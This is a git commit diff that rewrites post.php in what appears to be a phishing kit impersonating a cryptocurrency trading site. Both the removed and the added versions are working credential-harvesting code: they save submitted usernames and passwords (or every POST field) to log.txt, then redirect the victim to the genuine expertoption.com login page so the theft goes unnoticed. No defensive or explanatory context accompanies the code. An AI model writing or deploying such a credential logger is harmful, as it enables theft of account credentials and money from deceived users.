69004a90791c68f03cdb19b6c5dd130237354780
SG_PRO <55870659+Ignitetch@users.noreply.github.com>
2020-09-06 12:20:37 -0400

    Add files via upload

--- sites/cryptocurrency/post.php
+++ sites/cryptocurrency/post.php
@@ -1,13 +1,5 @@
 <?php
-header ('Location: https://expertoption.com/login');
-$handle = fopen("log.txt", "a");
-foreach($_POST as $variable => $value) {
-fwrite($handle, $variable);
-fwrite($handle, "=");
-fwrite($handle, $value);
-fwrite($handle, "\r\n");
-}
-fwrite($handle, "\r\n");
-fclose($handle);
-exit;
-?>
+
+    file_put_contents("log.txt", "Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location: https://expertoption.com/login');
+exit();
